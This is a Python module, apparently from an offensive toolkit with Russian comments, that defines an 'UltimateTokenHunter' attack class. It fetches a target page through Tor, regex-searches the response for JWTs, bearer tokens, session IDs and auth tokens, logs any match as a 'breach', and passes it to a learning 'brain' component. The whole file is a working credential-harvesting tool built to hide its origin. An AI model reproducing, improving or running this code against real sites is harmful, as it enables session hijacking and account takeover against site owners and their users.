# src/attacks/token_hunter.py — ФИКС v15.2
import httpx
import re
import asyncio
from typing import Dict, Any, Optional
from src.core.logger import RealTimeLogger
from src.utils.tor_helper import TorClient

class UltimateTokenHunter:
    def __init__(self, logger: RealTimeLogger, brain=None, config: Dict = None):
        self.logger = logger
        self.brain = brain
        self.config = config or {}
        self.tor = TorClient(self.config, logger)  # ← ПРАВИЛЬНО: config + logger

    async def _request(self, url: str, **kwargs):
        return await self.tor.request('GET', url, **kwargs)

    async def attack(self, target: str, options: Dict[str, Any]) -> Dict[str, Any]:
        result = {
            "attack": "token_hunter",
            "success": False,
            "token": None,
            "type": None,
            "risk": 9
        }

        try:
            resp = await self._request(target)
            text = resp.text

            # === ПОИСК ТОКЕНОВ ===
            patterns = {
                "jwt": r'ey[A-Za-z0-9-_=]+\.ey[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*',
                "bearer": r'(?i)bearer[\\s:]+([A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.[A-Za-z0-9-_.+/=]*)',
                "session": r'SESSIONID=[A-Za-z0-9]{32,}',
                "auth": r'"auth_token":\s*"([^"]+)"'
            }

            for typ, pattern in patterns.items():
                match = re.search(pattern, text)
                if match:
                    token = match.group(1) if match.groups() else match.group(0)
                    result.update({
                        "success": True,
                        "token": token,
                        "type": typ,
                        "vulnerable_payload": token
                    })
                    self.logger.breach(f"ТОКЕН НАЙДЕН: {typ.upper()} → {token[:50]}...")
                    if self.brain:
                        self.brain.learn("token_hunter", target, token, True, text[:300])
                    break

        except Exception as e:
            self.logger.error(f"TokenHunter error: {e}")

        return result